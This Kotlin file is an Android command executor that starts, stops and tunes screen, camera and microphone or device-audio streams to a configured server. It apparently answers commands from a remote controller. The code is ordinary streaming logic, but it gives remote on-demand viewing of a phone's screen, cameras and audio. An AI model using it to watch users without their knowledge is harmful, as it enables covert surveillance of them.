package com.abuzahra.manager.executor

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.app.ActivityCompat
import com.abuzahra.manager.Config
import com.abuzahra.manager.streaming.*
import com.google.gson.Gson
import kotlinx.coroutines.*

/**
 * StreamExecutor - Handles all streaming commands
 * Interfaces with StreamManager to manage screen, camera, and audio streams
 * 
 * Supported commands:
 * - start_screen_stream: Start screen streaming with quality/fps parameters
 * - stop_screen_stream: Stop screen streaming
 * - start_camera_stream: Start camera streaming (front/back, quality)
 * - stop_camera_stream: Stop camera streaming
 * - switch_camera: Switch between front/back camera during stream
 * - start_audio_stream: Start audio streaming (mic/device)
 * - stop_audio_stream: Stop audio streaming
 * - get_stream_status: Get current streaming status
 * - set_stream_quality: Change stream quality on-the-fly
 * - enable_torch: Enable/disable torch during camera stream
 */
object StreamExecutor {

    private const val TAG = "StreamExecutor"
    
    // Coroutine scope for async operations
    private val executorScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    
    // Store active stream IDs for reference
    @Volatile private var activeScreenStreamId: String? = null
    @Volatile private var activeCameraStreamId: String? = null
    @Volatile private var activeAudioStreamId: String? = null
    
    // ========== SCREEN STREAMING ==========
    
    /**
     * Start screen streaming
     * 
     * Required params:
     * - quality: (optional) LOW, MEDIUM, HIGH, ULTRA - default MEDIUM
     * - fps: (optional) 15, 24, 30, 60 - default 30
     * - bitrate: (optional) video bitrate in bps - default based on quality
     * - server_url: (optional) custom streaming server URL
     * - stream_key: (optional) stream key for authentication
     */
    fun startScreenStream(context: Context, params: Map<String, Any>): Map<String, Any> {
        return try {
            Log.i(TAG, "Starting screen stream: command=screen, params=${params.keys.toList()}")
            
            // Check if already streaming
            if (activeScreenStreamId != null && StreamManager.isStreamActive(activeScreenStreamId!!)) {
                return mapOf(
                    "status" to "already_streaming",
                    "stream_id" to activeScreenStreamId!!,
                    "message" to "Screen stream is already active"
                )
            }
            
            // Check MediaProjection permission
            if (!ScreenStreamService.hasPermission()) {
                // Auto-request permission and return waiting status
                return PendingStreamManager.requestPermissionAndStart(
                    context, "screen", params
                )
            }
            
            // Parse quality
            val quality = parseQuality(params["quality"]?.toString())
            
            // Parse FPS
            val fps = (params["fps"] as? Number)?.toInt() ?: 30
            val validFps = if (fps in listOf(15, 24, 30, 60)) fps else 30
            
            // Parse bitrate
            val bitrate = (params["bitrate"] as? Number)?.toInt() ?: quality.videoBitrate
            
            // Auto-fill server URL from config if not provided
            val serverUrl = params["server_url"]?.toString()?.takeIf { it.isNotBlank() }
                ?: Config.getBaseUrl()
            
            // Create configuration
            val config = StreamConfig.Configuration(
                streamType = StreamConfig.StreamType.SCREEN,
                quality = quality,
                fps = validFps,
                videoBitrate = bitrate,
                audioEnabled = params["audio"]?.toString()?.toBoolean() ?: true,
                serverUrl = serverUrl,
                streamKey = params["stream_key"]?.toString() ?: "",
                enableAdaptiveBitrate = params["adaptive_bitrate"]?.toString()?.toBoolean() ?: true
            )
            
            // Validate configuration (server URL is auto-filled, so no error)
            val errors = StreamConfig.validateConfig(config)
            if (errors.isNotEmpty()) {
                return mapOf(
                    "status" to "error",
                    "message" to "Invalid configuration",
                    "errors" to errors
                )
            }
            
            // Start stream using StreamManager
            val streamId = StreamManager.startScreenStream(
                config = config,
                resultCode = ScreenStreamService.lastResultCode,
                resultData = ScreenStreamService.lastPermissionData
            )
            
            activeScreenStreamId = streamId
            
            mapOf(
                "status" to "started",
                "stream_id" to streamId,
                "message" to "Screen stream started successfully",
                "config" to mapOf(
                    "quality" to quality.name,
                    "fps" to validFps,
                    "bitrate" to bitrate,
                    "resolution" to "${config.width}x${config.height}"
                )
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start screen stream", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to start screen stream: ${e.message}"
            )
        }
    }
    
    /**
     * Stop screen streaming
     */
    fun stopScreenStream(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
        return try {
            Log.i(TAG, "Stopping screen stream")
            
            val streamId = params["stream_id"]?.toString() ?: activeScreenStreamId
            
            if (streamId == null) {
                return mapOf(
                    "status" to "not_streaming",
                    "message" to "No active screen stream found"
                )
            }
            
            // Get session info before stopping
            val session = StreamManager.getSession(streamId)
            val duration = session?.let { System.currentTimeMillis() - it.createdAt } ?: 0L
            val bytesSent = session?.state?.totalBytesSent ?: 0L
            val framesEncoded = session?.state?.totalFramesEncoded ?: 0L
            
            // Stop the stream
            StreamManager.stopScreenStream(streamId)
            
            // Clear active ID if it matches
            if (activeScreenStreamId == streamId) {
                activeScreenStreamId = null
            }
            
            mapOf(
                "status" to "stopped",
                "stream_id" to streamId,
                "message" to "Screen stream stopped successfully",
                "statistics" to mapOf(
                    "duration_ms" to duration,
                    "bytes_sent" to bytesSent,
                    "frames_encoded" to framesEncoded
                )
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop screen stream", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to stop screen stream: ${e.message}"
            )
        }
    }
    
    // ========== CAMERA STREAMING ==========
    
    /**
     * Start camera streaming
     * 
     * Required params:
     * - camera: (optional) "front" or "back" - default "back"
     * - quality: (optional) LOW, MEDIUM, HIGH, ULTRA - default MEDIUM
     * - fps: (optional) 15, 24, 30, 60 - default 30
     * - bitrate: (optional) video bitrate in bps - default based on quality
     * - server_url: (optional) custom streaming server URL
     * - stream_key: (optional) stream key for authentication
     */
    fun startCameraStream(context: Context, params: Map<String, Any>): Map<String, Any> {
        return try {
            Log.i(TAG, "Starting camera stream: command=camera, params=${params.keys.toList()}")
            
            // Check camera permission
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED) {
                return mapOf(
                    "status" to "permission_required",
                    "message" to "Camera permission required",
                    "permission_required" to "android.permission.CAMERA"
                )
            }
            
            // Check if already streaming
            if (activeCameraStreamId != null && StreamManager.isStreamActive(activeCameraStreamId!!)) {
                return mapOf(
                    "status" to "already_streaming",
                    "stream_id" to activeCameraStreamId!!,
                    "message" to "Camera stream is already active"
                )
            }
            
            // Parse camera selection
            val cameraParam = params["camera"]?.toString()?.lowercase() ?: "back"
            val cameraId = when (cameraParam) {
                "front" -> CameraStreamService.CAMERA_FRONT
                "back" -> CameraStreamService.CAMERA_BACK
                else -> CameraStreamService.CAMERA_BACK
            }
            
            // Parse quality
            val quality = parseQuality(params["quality"]?.toString())
            
            // Parse FPS
            val fps = (params["fps"] as? Number)?.toInt() ?: 30
            val validFps = if (fps in listOf(15, 24, 30, 60)) fps else 30
            
            // Parse bitrate
            val bitrate = (params["bitrate"] as? Number)?.toInt() ?: quality.videoBitrate
            
            // Auto-fill server URL from config if not provided
            val serverUrl = params["server_url"]?.toString()?.takeIf { it.isNotBlank() }
                ?: Config.getBaseUrl()
            
            // Create configuration
            val config = StreamConfig.Configuration(
                streamType = if (cameraId == CameraStreamService.CAMERA_FRONT) 
                    StreamConfig.StreamType.CAMERA_FRONT 
                else 
                    StreamConfig.StreamType.CAMERA_BACK,
                quality = quality,
                fps = validFps,
                videoBitrate = bitrate,
                audioEnabled = params["audio"]?.toString()?.toBoolean() ?: false,
                serverUrl = serverUrl,
                streamKey = params["stream_key"]?.toString() ?: "",
                enableAdaptiveBitrate = params["adaptive_bitrate"]?.toString()?.toBoolean() ?: true
            )
            
            // Validate configuration
            val errors = StreamConfig.validateConfig(config)
            if (errors.isNotEmpty()) {
                return mapOf(
                    "status" to "error",
                    "message" to "Invalid configuration",
                    "errors" to errors
                )
            }
            
            // Start stream using StreamManager
            val streamId = StreamManager.startCameraStream(
                config = config,
                cameraId = cameraId
            )
            
            activeCameraStreamId = streamId
            
            mapOf(
                "status" to "started",
                "stream_id" to streamId,
                "message" to "Camera stream started successfully",
                "camera" to cameraParam,
                "config" to mapOf(
                    "quality" to quality.name,
                    "fps" to validFps,
                    "bitrate" to bitrate,
                    "resolution" to "${config.width}x${config.height}"
                )
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start camera stream", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to start camera stream: ${e.message}"
            )
        }
    }
    
    /**
     * Stop camera streaming
     */
    fun stopCameraStream(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
        return try {
            Log.i(TAG, "Stopping camera stream")
            
            val streamId = params["stream_id"]?.toString() ?: activeCameraStreamId
            
            if (streamId == null) {
                return mapOf(
                    "status" to "not_streaming",
                    "message" to "No active camera stream found"
                )
            }
            
            // Get session info before stopping
            val session = StreamManager.getSession(streamId)
            val duration = session?.let { System.currentTimeMillis() - it.createdAt } ?: 0L
            val bytesSent = session?.state?.totalBytesSent ?: 0L
            val framesEncoded = session?.state?.totalFramesEncoded ?: 0L
            
            // Stop the stream
            StreamManager.stopCameraStream(streamId)
            
            // Clear active ID if it matches
            if (activeCameraStreamId == streamId) {
                activeCameraStreamId = null
            }
            
            mapOf(
                "status" to "stopped",
                "stream_id" to streamId,
                "message" to "Camera stream stopped successfully",
                "statistics" to mapOf(
                    "duration_ms" to duration,
                    "bytes_sent" to bytesSent,
                    "frames_encoded" to framesEncoded
                )
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop camera stream", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to stop camera stream: ${e.message}"
            )
        }
    }
    
    /**
     * Switch between front and back camera during stream
     */
    fun switchCamera(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
        return try {
            Log.i(TAG, "Switching camera")
            
            if (activeCameraStreamId == null || !StreamManager.isStreamActive(activeCameraStreamId!!)) {
                return mapOf(
                    "status" to "not_streaming",
                    "message" to "No active camera stream to switch"
                )
            }
            
            // Get current session to determine current camera
            val session = StreamManager.getSession(activeCameraStreamId!!)
            val currentCamera = session?.streamType?.name?.let { 
                if (it.contains("FRONT")) "front" else "back"
            } ?: "back"
            
            // Switch camera via StreamManager
            StreamManager.switchCamera(activeCameraStreamId)
            
            val newCamera = if (currentCamera == "front") "back" else "front"
            
            mapOf(
                "status" to "switched",
                "stream_id" to activeCameraStreamId!!,
                "message" to "Camera switched successfully",
                "previous_camera" to currentCamera,
                "current_camera" to newCamera
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to switch camera", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to switch camera: ${e.message}"
            )
        }
    }
    
    // ========== AUDIO STREAMING ==========
    
    /**
     * Start audio streaming
     * 
     * Required params:
     * - source: (optional) "microphone" or "device" - default "microphone"
     * - bitrate: (optional) audio bitrate in bps - default 128000
     * - server_url: (optional) custom streaming server URL
     * - stream_key: (optional) stream key for authentication
     * - noise_suppression: (optional) enable noise suppression - default true
     */
    fun startAudioStream(context: Context, params: Map<String, Any>): Map<String, Any> {
        return try {
            Log.i(TAG, "Starting audio stream: command=audio, params=${params.keys.toList()}")
            
            // Parse source
            val source = when (params["source"]?.toString()?.lowercase()) {
                "device", "device_audio" -> AudioStreamService.SOURCE_DEVICE_AUDIO
                "both" -> AudioStreamService.SOURCE_BOTH
                else -> AudioStreamService.SOURCE_MICROPHONE
            }
            
            // Check microphone permission for microphone source
            if (source == AudioStreamService.SOURCE_MICROPHONE || source == AudioStreamService.SOURCE_BOTH) {
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) 
                    != PackageManager.PERMISSION_GRANTED) {
                    return mapOf(
                        "status" to "permission_required",
                        "message" to "Record audio permission required",
                        "permission_required" to "android.permission.RECORD_AUDIO"
                    )
                }
            }
            
            // Check if already streaming
            if (activeAudioStreamId != null && StreamManager.isStreamActive(activeAudioStreamId!!)) {
                return mapOf(
                    "status" to "already_streaming",
                    "stream_id" to activeAudioStreamId!!,
                    "message" to "Audio stream is already active"
                )
            }
            
            // Parse bitrate
            val bitrate = (params["bitrate"] as? Number)?.toInt() ?: StreamConfig.DEFAULT_AUDIO_BITRATE
            val validBitrate = bitrate.coerceIn(StreamConfig.MIN_AUDIO_BITRATE, StreamConfig.MAX_AUDIO_BITRATE)
            
            // Auto-fill server URL from config if not provided
            val serverUrl = params["server_url"]?.toString()?.takeIf { it.isNotBlank() }
                ?: Config.getBaseUrl()
            
            // Create configuration
            val config = StreamConfig.Configuration(
                streamType = if (source == AudioStreamService.SOURCE_DEVICE_AUDIO) 
                    StreamConfig.StreamType.AUDIO_DEVICE 
                else 
                    StreamConfig.StreamType.AUDIO_MIC,
                videoEnabled = false,
                audioEnabled = true,
                audioBitrate = validBitrate,
                serverUrl = serverUrl,
                streamKey = params["stream_key"]?.toString() ?: "",
                enableNoiseSuppression = params["noise_suppression"]?.toString()?.toBoolean() ?: true,
                enableEchoCancellation = params["echo_cancellation"]?.toString()?.toBoolean() ?: true
            )
            
            // For device audio on Android 10+, we need MediaProjection permission
            var mediaProjectionResultCode = 0
            var mediaProjectionData: Intent? = null
            
            if (source == AudioStreamService.SOURCE_DEVICE_AUDIO && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                if (!ScreenStreamService.hasPermission()) {
                    // Auto-request permission and return waiting status
                    return PendingStreamManager.requestPermissionAndStart(
                        context, "audio_device", params
                    )
                }
                mediaProjectionResultCode = ScreenStreamService.lastResultCode
                mediaProjectionData = ScreenStreamService.lastPermissionData
            }
            
            // Start stream using StreamManager
            val streamId = StreamManager.startAudioStream(
                config = config,
                source = source,
                mediaProjectionResultCode = mediaProjectionResultCode,
                mediaProjectionData = mediaProjectionData
            )
            
            activeAudioStreamId = streamId
            
            mapOf(
                "status" to "started",
                "stream_id" to streamId,
                "message" to "Audio stream started successfully",
                "source" to source,
                "config" to mapOf(
                    "bitrate" to validBitrate,
                    "sample_rate" to StreamConfig.AUDIO_SAMPLE_RATE,
                    "channels" to StreamConfig.AUDIO_CHANNEL_COUNT,
                    "noise_suppression" to config.enableNoiseSuppression
                )
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start audio stream", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to start audio stream: ${e.message}"
            )
        }
    }
    
    /**
     * Stop audio streaming
     */
    fun stopAudioStream(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
        return try {
            Log.i(TAG, "Stopping audio stream")
            
            val streamId = params["stream_id"]?.toString() ?: activeAudioStreamId
            
            if (streamId == null) {
                return mapOf(
                    "status" to "not_streaming",
                    "message" to "No active audio stream found"
                )
            }
            
            // Get session info before stopping
            val session = StreamManager.getSession(streamId)
            val duration = session?.let { System.currentTimeMillis() - it.createdAt } ?: 0L
            val bytesSent = session?.state?.totalBytesSent ?: 0L
            val framesEncoded = session?.state?.totalFramesEncoded ?: 0L
            
            // Stop the stream
            StreamManager.stopAudioStream(streamId)
            
            // Clear active ID if it matches
            if (activeAudioStreamId == streamId) {
                activeAudioStreamId = null
            }
            
            mapOf(
                "status" to "stopped",
                "stream_id" to streamId,
                "message" to "Audio stream stopped successfully",
                "statistics" to mapOf(
                    "duration_ms" to duration,
                    "bytes_sent" to bytesSent,
                    "frames_encoded" to framesEncoded
                )
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop audio stream", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to stop audio stream: ${e.message}"
            )
        }
    }
    
    // ========== STATUS & CONTROL ==========
    
    /**
     * Get current streaming status
     * Returns status of all active streams
     */
    fun getStreamStatus(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
        return try {
            val specificStreamId = params["stream_id"]?.toString()
            
            if (specificStreamId != null) {
                // Get status for specific stream
                val session = StreamManager.getSession(specificStreamId)
                
                if (session == null) {
                    return mapOf(
                        "status" to "not_found",
                        "stream_id" to specificStreamId,
                        "message" to "Stream not found"
                    )
                }
                
                return mapOf(
                    "stream_id" to specificStreamId,
                    "stream_type" to session.streamType.name,
                    "is_active" to session.state.isActive,
                    "is_paused" to session.state.paused,
                    "duration_ms" to (System.currentTimeMillis() - session.createdAt),
                    "bytes_sent" to session.state.totalBytesSent,
                    "frames_encoded" to session.state.totalFramesEncoded,
                    "current_bitrate" to session.state.currentBitrate,
                    "last_error" to (session.state.lastError ?: ""),
                    "config" to session.config.toMap()
                )
            }
            
            // Get all stream statuses
            val sessions = StreamManager.getActiveSessions()
            val statistics = StreamManager.getStatistics()
            
            mapOf(
                "active_stream_count" to sessions.size,
                "active_stream_ids" to sessions.keys.toList(),
                "total_bytes_sent" to (statistics["total_bytes_sent"] ?: 0L),
                "total_frames_encoded" to (statistics["total_frames_encoded"] ?: 0),
                "streams" to sessions.mapValues { (_, session) ->
                    mapOf(
                        "type" to session.streamType.name,
                        "is_active" to session.state.isActive,
                        "is_paused" to session.state.paused,
                        "duration_ms" to (System.currentTimeMillis() - session.createdAt),
                        "bytes_sent" to session.state.totalBytesSent,
                        "frames_encoded" to session.state.totalFramesEncoded
                    )
                },
                "screen_stream" to if (activeScreenStreamId != null) {
                    mapOf("active" to true, "stream_id" to activeScreenStreamId)
                } else {
                    mapOf("active" to false)
                },
                "camera_stream" to if (activeCameraStreamId != null) {
                    mapOf("active" to true, "stream_id" to activeCameraStreamId)
                } else {
                    mapOf("active" to false)
                },
                "audio_stream" to if (activeAudioStreamId != null) {
                    mapOf("active" to true, "stream_id" to activeAudioStreamId)
                } else {
                    mapOf("active" to false)
                }
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get stream status", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to get stream status: ${e.message}"
            )
        }
    }
    
    /**
     * Set stream quality on-the-fly
     * 
     * Required params:
     * - quality: LOW, MEDIUM, HIGH, or ULTRA
     * - stream_id: (optional) specific stream ID, or applies to all active streams
     */
    fun setStreamQuality(context: Context, params: Map<String, Any>): Map<String, Any> {
        return try {
            Log.i(TAG, "Setting stream quality: $params")
            
            val qualityParam = params["quality"]?.toString()
            if (qualityParam.isNullOrBlank()) {
                return mapOf(
                    "status" to "error",
                    "message" to "Quality parameter required"
                )
            }
            
            val quality = parseQuality(qualityParam)
            val streamId = params["stream_id"]?.toString()
            
            if (streamId != null) {
                // Update specific stream
                val session = StreamManager.getSession(streamId)
                if (session == null) {
                    return mapOf(
                        "status" to "not_found",
                        "message" to "Stream not found: $streamId"
                    )
                }
                
                // Update configuration
                val newConfig = session.config.copy(
                    quality = quality,
                    width = quality.width,
                    height = quality.height,
                    videoBitrate = quality.videoBitrate
                )
                
                // Update stream via service intent
                when (session.streamType) {
                    StreamConfig.StreamType.SCREEN -> {
                        val intent = Intent(context, ScreenStreamService::class.java).apply {
                            action = ScreenStreamService.ACTION_UPDATE_CONFIG
                            putExtra(ScreenStreamService.EXTRA_CONFIG, Gson().toJson(newConfig))
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            context.startForegroundService(intent)
                        } else {
                            context.startService(intent)
                        }
                    }
                    StreamConfig.StreamType.CAMERA_FRONT, StreamConfig.StreamType.CAMERA_BACK -> {
                        val intent = Intent(context, CameraStreamService::class.java).apply {
                            action = CameraStreamService.ACTION_UPDATE_QUALITY
                            putExtra(CameraStreamService.EXTRA_QUALITY, quality.name)
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            context.startForegroundService(intent)
                        } else {
                            context.startService(intent)
                        }
                    }
                    else -> {
                        // Audio streams don't have video quality settings
                        return mapOf(
                            "status" to "error",
                            "message" to "Quality setting not applicable to audio streams"
                        )
                    }
                }
                
                return mapOf(
                    "status" to "updated",
                    "stream_id" to streamId,
                    "quality" to quality.name,
                    "message" to "Stream quality updated successfully"
                )
            }
            
            // Update all active video streams
            val updatedStreams = mutableListOf<String>()
            val errors = mutableListOf<String>()
            
            mapOf(
                "screen" to activeScreenStreamId,
                "camera" to activeCameraStreamId
            ).forEach { (type, id) ->
                if (id != null && StreamManager.isStreamActive(id)) {
                    try {
                        val session = StreamManager.getSession(id) ?: return@forEach
                        
                        val newConfig = session.config.copy(
                            quality = quality,
                            width = quality.width,
                            height = quality.height,
                            videoBitrate = quality.videoBitrate
                        )
                        
                        when (session.streamType) {
                            StreamConfig.StreamType.SCREEN -> {
                                val intent = Intent(context, ScreenStreamService::class.java).apply {
                                    action = ScreenStreamService.ACTION_UPDATE_CONFIG
                                    putExtra(ScreenStreamService.EXTRA_CONFIG, Gson().toJson(newConfig))
                                }
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    context.startForegroundService(intent)
                                } else {
                                    context.startService(intent)
                                }
                            }
                            StreamConfig.StreamType.CAMERA_FRONT, StreamConfig.StreamType.CAMERA_BACK -> {
                                val intent = Intent(context, CameraStreamService::class.java).apply {
                                    action = CameraStreamService.ACTION_UPDATE_QUALITY
                                    putExtra(CameraStreamService.EXTRA_QUALITY, quality.name)
                                }
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    context.startForegroundService(intent)
                                } else {
                                    context.startService(intent)
                                }
                            }
                            else -> {}
                        }
                        
                        updatedStreams.add(id)
                    } catch (e: Exception) {
                        errors.add("$type: ${e.message}")
                    }
                }
            }
            
            mapOf(
                "status" to if (updatedStreams.isNotEmpty()) "updated" else "no_streams",
                "quality" to quality.name,
                "updated_streams" to updatedStreams,
                "errors" to errors,
                "message" to if (updatedStreams.isNotEmpty()) 
                    "Quality updated for ${updatedStreams.size} stream(s)" 
                else 
                    "No active video streams to update"
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to set stream quality", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to set stream quality: ${e.message}"
            )
        }
    }
    
    /**
     * Enable or disable torch during camera stream
     * 
     * Required params:
     * - enable: true to enable torch, false to disable
     * - stream_id: (optional) specific stream ID
     */
    fun enableTorch(context: Context, params: Map<String, Any>): Map<String, Any> {
        return try {
            Log.i(TAG, "Setting torch: $params")
            
            val enable = params["enable"]?.toString()?.toBoolean() 
                ?: params["arg"]?.toString()?.toBoolean()
                ?: true
            
            val streamId = params["stream_id"]?.toString() ?: activeCameraStreamId
            
            if (streamId == null || !StreamManager.isStreamActive(streamId)) {
                return mapOf(
                    "status" to "not_streaming",
                    "message" to "No active camera stream for torch control"
                )
            }
            
            // Verify it's a camera stream
            val session = StreamManager.getSession(streamId)
            if (session == null || 
                (session.streamType != StreamConfig.StreamType.CAMERA_FRONT && 
                 session.streamType != StreamConfig.StreamType.CAMERA_BACK)) {
                return mapOf(
                    "status" to "error",
                    "message" to "Torch control is only available for camera streams"
                )
            }
            
            // Check if camera supports flash
            // Note: Front cameras typically don't have flash
            if (session.streamType == StreamConfig.StreamType.CAMERA_FRONT) {
                return mapOf(
                    "status" to "not_supported",
                    "message" to "Torch is typically not available on front camera"
                )
            }
            
            // Toggle torch via StreamManager
            StreamManager.toggleTorch(streamId)
            
            mapOf(
                "status" to "success",
                "stream_id" to streamId,
                "torch_enabled" to enable,
                "message" to "Torch ${if (enable) "enabled" else "disabled"} successfully"
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to set torch", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to set torch: ${e.message}"
            )
        }
    }
    
    // ========== PAUSE/RESUME ==========
    
    /**
     * Pause a stream
     */
    fun pauseStream(context: Context, params: Map<String, Any>): Map<String, Any> {
        return try {
            val streamId = params["stream_id"]?.toString()
                ?: activeScreenStreamId
                ?: activeCameraStreamId
                ?: activeAudioStreamId
            
            if (streamId == null) {
                return mapOf(
                    "status" to "not_streaming",
                    "message" to "No active stream to pause"
                )
            }
            
            StreamManager.pauseStream(streamId)
            
            mapOf(
                "status" to "paused",
                "stream_id" to streamId,
                "message" to "Stream paused successfully"
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to pause stream", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to pause stream: ${e.message}"
            )
        }
    }
    
    /**
     * Resume a paused stream
     */
    fun resumeStream(context: Context, params: Map<String, Any>): Map<String, Any> {
        return try {
            val streamId = params["stream_id"]?.toString()
                ?: activeScreenStreamId
                ?: activeCameraStreamId
                ?: activeAudioStreamId
            
            if (streamId == null) {
                return mapOf(
                    "status" to "not_streaming",
                    "message" to "No stream to resume"
                )
            }
            
            StreamManager.resumeStream(streamId)
            
            mapOf(
                "status" to "resumed",
                "stream_id" to streamId,
                "message" to "Stream resumed successfully"
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to resume stream", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to resume stream: ${e.message}"
            )
        }
    }
    
    /**
     * Stop all active streams
     */
    fun stopAllStreams(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
        return try {
            Log.i(TAG, "Stopping all streams")
            
            val sessions = StreamManager.getActiveSessions()
            val streamCount = sessions.size
            
            StreamManager.stopAllStreams()
            
            // Clear all active IDs
            activeScreenStreamId = null
            activeCameraStreamId = null
            activeAudioStreamId = null
            
            mapOf(
                "status" to "success",
                "message" to "All streams stopped successfully",
                "streams_stopped" to streamCount
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop all streams", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to stop all streams: ${e.message}"
            )
        }
    }
    
    // ========== HELPER METHODS ==========
    
    /**
     * Parse quality string to Quality enum
     */
    private fun parseQuality(qualityStr: String?): StreamConfig.Quality {
        return when (qualityStr?.uppercase()) {
            "LOW", "480P" -> StreamConfig.Quality.LOW
            "MEDIUM", "720P", "HD" -> StreamConfig.Quality.MEDIUM
            "HIGH", "1080P", "FULL_HD", "FHD" -> StreamConfig.Quality.HIGH
            "ULTRA", "1440P", "QHD", "2K" -> StreamConfig.Quality.ULTRA
            else -> StreamConfig.Quality.MEDIUM
        }
    }
    
    /**
     * Get supported streaming capabilities of the device
     */
    fun getCapabilities(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
        return try {
            val supportedCodecs = mutableListOf<String>()
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val codecCount = android.media.MediaCodecList.getCodecCount()
                for (i in 0 until codecCount) {
                    val info = android.media.MediaCodecList.getCodecInfoAt(i)
                    if (info.isEncoder) {
                        info.supportedTypes.forEach { type ->
                            when {
                                type.equals("video/avc", ignoreCase = true) && !supportedCodecs.contains("H264") -> 
                                    supportedCodecs.add("H264")
                                type.equals("video/hevc", ignoreCase = true) && !supportedCodecs.contains("H265") -> 
                                    supportedCodecs.add("H265")
                                type.equals("audio/mp4a-latm", ignoreCase = true) && !supportedCodecs.contains("AAC") -> 
                                    supportedCodecs.add("AAC")
                                type.equals("audio/opus", ignoreCase = true) && !supportedCodecs.contains("OPUS") -> 
                                    supportedCodecs.add("OPUS")
                            }
                        }
                    }
                }
            }
            
            // Check camera capabilities
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? android.hardware.camera2.CameraManager
            val cameraIds = cameraManager?.cameraIdList ?: emptyArray()
            val hasFrontCamera = cameraIds.any { id ->
                cameraManager!!.getCameraCharacteristics(id)
                    .get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) == 
                    android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
            }
            val hasBackCamera = cameraIds.any { id ->
                cameraManager!!.getCameraCharacteristics(id)
                    .get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) == 
                    android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
            }
            val hasFlash = cameraIds.any { id ->
                cameraManager!!.getCameraCharacteristics(id)
                    .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            }
            
            mapOf(
                "supported_codecs" to supportedCodecs,
                "screen_capture" to (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP),
                "device_audio_capture" to (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q),
                "camera" to mapOf(
                    "available" to cameraIds.isNotEmpty(),
                    "front_camera" to hasFrontCamera,
                    "back_camera" to hasBackCamera,
                    "flash" to hasFlash
                ),
                "microphone" to true,
                "max_resolution" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) "1080p" else "720p",
                "max_fps" to 60,
                "adaptive_bitrate" to true,
                "noise_suppression" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) 
                    android.media.audiofx.NoiseSuppressor.isAvailable() 
                else 
                    false
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get capabilities", e)
            mapOf(
                "status" to "error",
                "message" to "Failed to get capabilities: ${e.message}"
            )
        }
    }
}
